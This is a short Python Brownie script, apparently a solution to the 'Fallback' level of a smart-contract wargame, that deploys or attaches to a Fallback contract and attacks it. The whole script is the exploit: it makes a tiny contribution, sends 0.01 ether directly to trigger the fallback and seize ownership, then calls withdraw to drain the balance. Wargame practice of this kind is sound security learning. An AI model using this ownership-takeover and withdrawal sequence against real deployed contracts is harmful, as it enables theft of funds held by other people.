from brownie import Fallback, MockV3Aggregator, network, config, accounts, Contract
from scripts.helpful_scripts import *
from web3 import Web3


def deploy_fallback():
    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        fallBack = Fallback.deploy({"from": accounts[0]}, publish_source=False)
    else:
        fallBackAddr = config["networks"][network.show_active()]["fallBack_address"]
        fallBack = Contract.from_abi("Fallback", fallBackAddr, Fallback.abi)

    
    print(f"Fallback deployed to {fallBack.address}")
    attackFallback(fallBack, account)

def attackFallback(_fallBack, _account):

    print(f"Before the attack...Current contributions: {_fallBack.getContribution()} Are we the owner?: {_fallBack.owner() == _account}")

    _fallBack.contribute({"value": 500000000000000, "from": _account})
    contributions = _fallBack.getContribution()
    print(f"Contributions now: {contributions}")
    _account.transfer(_fallBack.address,"0.01 ether")
    owner = _fallBack.owner()
    areWeOwner = (owner == _account)
    print(f"Sent .01 ETH. Are we the owner?: {areWeOwner}")
    _fallBack.withdraw({"from":_account})



def main():
    #deploy_fund_me()
    deploy_fallback()
